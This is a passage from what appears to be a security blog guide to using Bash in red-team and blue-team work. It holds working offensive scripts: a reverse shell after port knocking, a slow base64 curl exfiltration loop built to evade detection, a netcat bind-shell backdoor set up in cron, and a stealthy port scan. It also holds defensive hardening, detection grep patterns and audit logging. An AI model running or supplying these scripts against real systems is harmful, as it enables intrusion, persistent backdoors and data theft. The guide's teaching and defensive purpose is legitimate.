+</span></span></code></pre></div><p>Checks common privilege escalation vectors. Run after initial access.</p><h3 id=port-knock-client>Port Knock Client<a href=#port-knock-client class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#75715e># Port knocking to open backdoor</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>HOST<span style=color:#f92672>=</span>$1
+</span></span><span style=display:flex><span>SEQUENCE<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;7000 8000 9000&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> port in $SEQUENCE; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>    echo &gt;/dev/tcp/$HOST/$port 2&gt;/dev/null
+</span></span><span style=display:flex><span>    sleep <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># After knock sequence, backdoor port should be open</span>
+</span></span><span style=display:flex><span>bash -i &gt;&amp; /dev/tcp/$HOST/4444 0&gt;&amp;<span style=color:#ae81ff>1</span>
+</span></span></code></pre></div><p>Port knocking hides backdoor. Firewall blocks 4444 until correct sequence sent.</p><h3 id=data-exfiltration-wrapper>Data Exfiltration Wrapper<a href=#data-exfiltration-wrapper class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#75715e># Exfiltrate files gradually to avoid detection</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>FILE<span style=color:#f92672>=</span>$1
+</span></span><span style=display:flex><span>DEST<span style=color:#f92672>=</span>$2
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Split into small chunks</span>
+</span></span><span style=display:flex><span>split -b 64K $FILE chunk_
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Send chunks slowly</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> chunk in chunk_*; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Encode and send</span>
+</span></span><span style=display:flex><span>    data<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>base64 &lt; $chunk<span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>    curl -s -X POST -d <span style=color:#e6db74>&#34;data=</span>$data<span style=color:#e6db74>&#34;</span> $DEST
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Clean up</span>
+</span></span><span style=display:flex><span>    rm $chunk
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Wait to avoid traffic spikes</span>
+</span></span><span style=display:flex><span>    sleep <span style=color:#66d9ef>$(</span>shuf -i 60-300 -n 1<span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
+</span></span></code></pre></div><p>Exfiltrates slowly. Random delays. Harder to detect than bulk transfer.</p><h2 id=defensive-best-practices>Defensive Best Practices<a href=#defensive-best-practices class=hanchor arialabel=Anchor>#</a></h2><h3 id=input-validation>Input Validation<a href=#input-validation class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#75715e># Safe input handling</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>validate_input<span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>    local input<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span>$1<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Only allow alphanumeric, underscore, hyphen</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>[[</span> ! $input <span style=color:#f92672>=</span>~ ^<span style=color:#f92672>[</span>a-zA-Z0-9_-<span style=color:#f92672>]</span>+$ <span style=color:#f92672>]]</span>; <span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;Invalid input&#34;</span> &gt;&amp;<span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>fi</span>
+</span></span><span style=display:flex><span>    echo <span style=color:#e6db74>&#34;</span>$input<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Usage</span>
+</span></span><span style=display:flex><span>user_input<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>validate_input <span style=color:#e6db74>&#34;</span>$1<span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>)</span> <span style=color:#f92672>||</span> exit <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>grep <span style=color:#e6db74>&#34;</span>$user_input<span style=color:#e6db74>&#34;</span> /var/log/auth.log
+</span></span></code></pre></div><p>Never trust user input. Validate before use. Prevents injection.</p><h3 id=secure-path>Secure PATH<a href=#secure-path class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#75715e># Lock down PATH</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Set known-good PATH</span>
+</span></span><span style=display:flex><span>PATH<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;</span>
+</span></span><span style=display:flex><span>readonly PATH
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Use absolute paths for critical commands</span>
+</span></span><span style=display:flex><span>/bin/grep <span style=color:#e6db74>&#34;root&#34;</span> /etc/passwd | /usr/bin/awk -F: <span style=color:#e6db74>&#39;{print $1}&#39;</span>
+</span></span></code></pre></div><p>Prevents PATH hijacking. Attacker can&rsquo;t replace commands with malicious versions.</p><h3 id=secure-temporary-files>Secure Temporary Files<a href=#secure-temporary-files class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#75715e># Safe temp file handling</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Create secure temp file</span>
+</span></span><span style=display:flex><span>TEMP<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>mktemp<span style=color:#66d9ef>)</span> <span style=color:#f92672>||</span> exit <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>trap <span style=color:#e6db74>&#39;rm -f &#34;$TEMP&#34;&#39;</span> EXIT
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Use temp file</span>
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;sensitive data&#34;</span> &gt; <span style=color:#e6db74>&#34;</span>$TEMP<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>process_data <span style=color:#e6db74>&#34;</span>$TEMP<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Automatically cleaned up on exit</span>
+</span></span></code></pre></div><p><code>mktemp</code> creates file with random name. <code>trap</code> ensures cleanup even if script crashes.</p><h2 id=detection-techniques>Detection Techniques<a href=#detection-techniques class=hanchor arialabel=Anchor>#</a></h2><h3 id=spotting-bash-abuse>Spotting Bash Abuse<a href=#spotting-bash-abuse class=hanchor arialabel=Anchor>#</a></h3><p>Monitor for suspicious Bash activity:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Watch for unusual Bash usage</span>
+</span></span><span style=display:flex><span>ps aux | grep bash | grep -E <span style=color:#e6db74>&#39;/dev/tcp|/dev/udp|base64|curl.*bash&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Check for backgrounded shells</span>
+</span></span><span style=display:flex><span>ps aux | grep bash | grep -v <span style=color:#e6db74>&#34;^</span>$USER<span style=color:#e6db74>&#34;</span> | grep <span style=color:#e6db74>&#34;&amp;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Monitor Bash history for suspicious commands</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> home in /home/*; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>[</span> -f <span style=color:#e6db74>&#34;</span>$home<span style=color:#e6db74>/.bash_history&#34;</span> <span style=color:#f92672>]</span> <span style=color:#f92672>&amp;&amp;</span> 
+</span></span><span style=display:flex><span>        grep -E <span style=color:#e6db74>&#39;wget|curl|base64|nc|socat|/dev/tcp&#39;</span> <span style=color:#e6db74>&#34;</span>$home<span style=color:#e6db74>/.bash_history&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
+</span></span></code></pre></div><h3 id=audit-logging>Audit Logging<a href=#audit-logging class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Enable process accounting</span>
+</span></span><span style=display:flex><span>apt-get install acct
+</span></span><span style=display:flex><span>systemctl enable acct
+</span></span><span style=display:flex><span>systemctl start acct
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Check executed commands</span>
+</span></span><span style=display:flex><span>lastcomm | grep bash
+</span></span><span style=display:flex><span>sa -u | grep bash
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Enable auditd for command logging</span>
+</span></span><span style=display:flex><span>auditctl -a always,exit -F arch<span style=color:#f92672>=</span>b64 -S execve -k exec_commands
+</span></span><span style=display:flex><span>ausearch -k exec_commands
+</span></span></code></pre></div><p>Process accounting logs every command. Auditd provides detailed execution logs.</p><h2 id=real-world-scenarios>Real-World Scenarios<a href=#real-world-scenarios class=hanchor arialabel=Anchor>#</a></h2><h3 id=scenario-locked-out-need-access>Scenario: Locked Out, Need Access<a href=#scenario-locked-out-need-access class=hanchor arialabel=Anchor>#</a></h3><p>You&rsquo;re on a system. Accidentally broke SSH config. Can&rsquo;t reconnect if disconnected. Need another way in.</p><div class=dialogue><p><span class="speaker speaker-sysadmin">Sysadmin:</span> Crap. SSH config is broken. If I disconnect, I&rsquo;m locked out.</p><p><span class="speaker speaker-engineer">Engineer:</span> Can you set up a backup access method?</p><p><span class="speaker speaker-sysadmin">Sysadmin:</span> Yeah, cron job to start nc listener.</p></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Add cron job that starts listener every 5 minutes</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>crontab -l; echo <span style=color:#e6db74>&#34;*/5 * * * * nc -lvp 9999 -e /bin/bash&#34;</span><span style=color:#f92672>)</span> | crontab -
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># From your machine</span>
+</span></span><span style=display:flex><span>nc target.com <span style=color:#ae81ff>9999</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Shell access restored</span>
+</span></span></code></pre></div><p>Not elegant. But works in a pinch.</p><h3 id=scenario-incident-response-need-quick-triage>Scenario: Incident Response, Need Quick Triage<a href=#scenario-incident-response-need-quick-triage class=hanchor arialabel=Anchor>#</a></h3><p>Called at 2am. System might be compromised. Need to check without specialized tools.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Quick compromise indicators</span>
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;[+] Recent connections:&#34;</span>
+</span></span><span style=display:flex><span>netstat -tunap | grep ESTABLISHED
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;[+] Listening ports:&#34;</span>
+</span></span><span style=display:flex><span>netstat -tunap | grep LISTEN
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;[+] Recent logins:&#34;</span>
+</span></span><span style=display:flex><span>last -10
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;[+] Running processes (non-root):&#34;</span>
+</span></span><span style=display:flex><span>ps aux | grep -v <span style=color:#e6db74>&#34;^root&#34;</span> | head -20
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;[+] Recent file modifications:&#34;</span>
+</span></span><span style=display:flex><span>find /tmp /var/tmp /dev/shm -type f -mmin -60 2&gt;/dev/null
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;[+] Suspicious cron jobs:&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> user in <span style=color:#66d9ef>$(</span>cut -f1 -d: /etc/passwd<span style=color:#66d9ef>)</span>; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>    crontab -u $user -l 2&gt;/dev/null | grep -v <span style=color:#e6db74>&#34;^#&#34;</span> | grep -E <span style=color:#e6db74>&#39;wget|curl|nc|bash&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
+</span></span></code></pre></div><p>Five minutes of checking. Catches obvious compromises.</p><h3 id=scenario-need-to-bypass-detection>Scenario: Need to Bypass Detection<a href=#scenario-need-to-bypass-detection class=hanchor arialabel=Anchor>#</a></h3><p>Red team engagement. Blue team has IDS watching for common tools. Need stealthy reconnaissance.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Use Bash instead of nmap</span>
+</span></span><span style=display:flex><span>target<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;192.168.1.10&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Port scan with random delays</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> port in <span style=color:#ae81ff>22</span> <span style=color:#ae81ff>80</span> <span style=color:#ae81ff>443</span> 3389; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>    timeout <span style=color:#ae81ff>1</span> bash -c <span style=color:#e6db74>&#34;echo &gt;/dev/tcp/</span>$target<span style=color:#e6db74>/</span>$port<span style=color:#e6db74>&#34;</span> 2&gt;/dev/null <span style=color:#f92672>&amp;&amp;</span> 
+</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;Port </span>$port<span style=color:#e6db74> open&#34;</span>
+</span></span><span style=display:flex><span>    sleep <span style=color:#66d9ef>$(</span>shuf -i 5-15 -n 1<span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Grab banners slowly</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> port in <span style=color:#66d9ef>$(</span>cat open_ports.txt<span style=color:#66d9ef>)</span>; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>    exec 3&lt;&gt;/dev/tcp/$target/$port
+</span></span><span style=display:flex><span>    timeout <span style=color:#ae81ff>2</span> cat &lt;&amp;<span style=color:#ae81ff>3</span>
+</span></span><span style=display:flex><span>    exec 3&gt;&amp;-
+</span></span><span style=display:flex><span>    sleep <span style=color:#66d9ef>$(</span>shuf -i 10-30 -n 1<span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
+</span></span></code></pre></div><p>Slow and steady. Random delays. No nmap signature. Harder to detect.</p><h2 id=limitations-and-risks>Limitations and Risks<a href=#limitations-and-risks class=hanchor arialabel=Anchor>#</a></h2><p>Bash isn&rsquo;t perfect for security work:</p><p><strong>Performance:</strong> Slower than compiled tools. For large-scale operations, write proper code.</p><p><strong>Error-prone:</strong> Easy to make mistakes. Missing quotes, word splitting, globbing. Test thoroughly.</p><p><strong>Not stealthy by default:</strong> Every command creates entries. History, logs, process accounting. You have to actively cover tracks.</p><p><strong>Limited functionality:</strong> Can&rsquo;t do everything. Complex protocols, binary manipulation, some network operations need real tools.</p><p><strong>Forensic evidence:</strong> Even memory-only execution leaves traces. Process memory, network connections, command lines in <code>/proc</code>.</p><p><strong>Detection:</strong> Defenders know these techniques too. SOC teams watch for <code>/dev/tcp</code>, unusual base64, suspicious process names.</p><p>Use Bash when it makes sense. Don&rsquo;t force it when proper tools would work better.</p><h2 id=ethical-and-legal-considerations>Ethical and Legal Considerations<a href=#ethical-and-legal-considerations class=hanchor arialabel=Anchor>#</a></h2><p>Everything in this guide is for authorized testing only.</p><p><strong>Don&rsquo;t:</strong></p><ul><li>Use these techniques on systems you don&rsquo;t own or have written permission to test</li><li>Deploy backdoors on production systems without change control</li><li>Exfiltrate data you&rsquo;re not authorized to access</li><li>Test techniques on systems where you only have user-level access</li></ul><p><strong>Do:</strong></p><ul><li>Get written authorization before testing</li><li>Document what you do during engagements</li><li>Clean up after yourself (remove backdoors, clear artifacts)</li><li>Report findings responsibly</li><li>Follow rules of engagement</li></ul><p>Unauthorized access is illegal. Computer Fraud and Abuse Act in the US. Computer Misuse Act in the UK. Similar laws everywhere.</p><p>If you&rsquo;re doing red team work, get a signed contract. Scope of work. Rules of engagement. Legal protection.</p><p>If you&rsquo;re doing blue team work, make sure your monitoring is legally sound. Privacy laws matter.</p><p>If you&rsquo;re learning, use your own systems. Virtual machines. Home labs. Not production. Not systems you don&rsquo;t own.</p><h2 id=tooling-recommendations>Tooling Recommendations<a href=#tooling-recommendations class=hanchor arialabel=Anchor>#</a></h2><p>Bash is great for living off the land. But sometimes you need real tools:</p><p><strong>Network scanning:</strong> nmap (better performance, more features)
+<strong>Exploitation:</strong> Metasploit (mature framework, lots of exploits)
+<strong>Post-exploitation:</strong> Empire, Covenant (proper C2 frameworks)
+<strong>Persistence:</strong> Implants written in compiled languages (harder to detect)
+<strong>Defense:</strong> OSSEC, Wazuh (proper HIDS/SIEM)
+<strong>Monitoring:</strong> Auditd, syslog-ng, Elastic Stack (proper logging)</p><p>Use Bash when:</p><ul><li>You&rsquo;re on a system without other tools</li><li>You need to avoid detection</li><li>Quick one-off tasks</li><li>Gluing tools together</li><li>Initial access and reconnaissance</li></ul><p>Use proper tools when:</p><ul><li>Large-scale operations</li><li>Long-term access needed</li><li>Complex protocols</li><li>Performance matters</li><li>Professional engagements</li></ul><h2 id=summary>Summary<a href=#summary class=hanchor arialabel=Anchor>#</a></h2><p>Bash is everywhere. That makes it valuable for security work. Red team can use it for reconnaissance, exploitation, persistence without installing tools. Blue team can use it for monitoring, incident response, threat hunting.</p><p>Key points:</p><ol><li><strong>Reconnaissance:</strong> Network scanning, service enumeration, information gathering without specialized tools</li><li><strong>Exploitation:</strong> Reverse shells, command injection, file transfer using only Bash</li><li><strong>Persistence:</strong> Cron jobs, profile modifications, SSH keys, binary replacement</li><li><strong>Defense:</strong> Monitoring, log analysis, integrity checking, incident response</li><li><strong>Covert channels:</strong> DNS, ICMP, HTTP for stealthy communication</li><li><strong>Anti-forensics:</strong> Memory-only execution, timestamp manipulation, track covering</li><li><strong>Evasion:</strong> Obfuscation, encoding, process hiding</li></ol><p>Bash won&rsquo;t replace specialized tools. But when you need to work with what&rsquo;s already there, it&rsquo;s incredibly powerful.</p><p>Know the techniques. Understand the limitations. Use ethically and legally.</p><p>Most importantly: test on systems you own. Get authorization for everything else.</p><hr><p><em>This guide covers techniques used in penetration testing and red team operations. All techniques should only be used on systems you own or have explicit written permission to test. Unauthorized access is illegal.</em></p></div></div><div class=related-posts style="margin-top:3rem;padding-top:2rem;border-top:1px solid #333"><h3>Related Posts</h3><ul style=list-style:none;padding:0><li style=margin-bottom:1rem><a href=https://gazsecops.github.io/posts/prometheus-security-monitoring/>Prometheus for Security: Monitoring What Actually Matters</a>
+<span style=color:#999;font-size:.9rem>- 18 Oct 2024</span><div style=font-size:.85rem;color:#666;margin-top:.25rem><span style=margin-right:.5rem>#security</span>
+<span style=margin-right:.5rem>#monitoring</span>
+<span style=margin-right:.5rem>#prometheus</span>
+<span style=margin-right:.5rem>#linux</span>
+<span style=margin-right:.5rem>#operations</span></div></li><li style=margin-bottom:1rem><a href=https://gazsecops.github.io/posts/penetration-testing-what-works/>Penetration Testing: What Actually Works vs What You Usually Get</a>
+<span style=color:#999;font-size:.9rem>- 20 Nov 2025</span><div style=font-size:.85rem;color:#666;margin-top:.25rem><span style=margin-right:.5rem>#security</span>
+<span style=margin-right:.5rem>#penetration-testing</span>
+<span style=margin-right:.5rem>#red-team</span>
+<span style=margin-right:.5rem>#operations</span>
+<span style=margin-right:.5rem>#assessment</span></div></li><li style=margin-bottom:1rem><a href=https://gazsecops.github.io/posts/stepca-running-internal-pki/>Smallstep step-ca: Running Internal PKI Without Losing Your Mind</a>
+<span style=color:#999;font-size:.9rem>- 28 Oct 2025</span><div style=font-size:.85rem;color:#666;margin-top:.25rem><span style=margin-right:.5rem>#security</span>
+<span style=margin-right:.5rem>#pki</span>
+<span style=margin-right:.5rem>#tls</span>
+<span style=margin-right:.5rem>#certificates</span>
+<span style=margin-right:.5rem>#linux</span>
+<span style=margin-right:.5rem>#cloud</span>
+<span style=margin-right:.5rem>#operations</span></div></li><li style=margin-bottom:1rem><a href=https://gazsecops.github.io/posts/incident-response-what-actually-works/>Incident Response: What Actually Works at 3am</a>
+<span style=color:#999;font-size:.9rem>- 2 Jul 2025</span><div style=font-size:.85rem;color:#666;margin-top:.25rem><span style=margin-right:.5rem>#security</span>
+<span style=margin-right:.5rem>#incident-response</span>
+<span style=margin-right:.5rem>#operations</span>
+<span style=margin-right:.5rem>#linux</span>
+<span style=margin-right:.5rem>#cloud</span></div></li><li style=margin-bottom:1rem><a href=https://gazsecops.github.io/posts/dns-security-what-actually-breaks/>DNS Security: What Actually Breaks</a>
+<span style=color:#999;font-size:.9rem>- 12 Jun 2025</span><div style=font-size:.85rem;color:#666;margin-top:.25rem><span style=margin-right:.5rem>#security</span>
+<span style=margin-right:.5rem>#dns</span>
+<span style=margin-right:.5rem>#linux</span>
+<span style=margin-right:.5rem>#cloud</span>
+<span style=margin-right:.5rem>#monitoring</span>
+<span style=margin-right:.5rem>#operations</span>
+<span style=margin-right:.5rem>#incident-response</span></div></li></ul></div><div class=pagination><div class=pagination__title><span class=pagination__title-h></span><hr></div><div class=pagination__buttons><a href=https://gazsecops.github.io/posts/confidential-computing-encrypted-data-processing/ class="button inline prev">&lt; [<span class=button__text>Confidential Computing: Processing Data While Keeping It Secret</span>]
+</a>::
+<a href=https://gazsecops.github.io/posts/security-tools-marketing-vs-reality/ class="button inline next">[<span class=button__text>Security Tools That Actually Work vs What Vendors Sell You</span>] ></a></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2026</span></div><div class=build-info><span class=build-commit>e733073</span><span class=build-date>2026-02-12 12:33 UTC</span></div></div></footer></div></body></html>
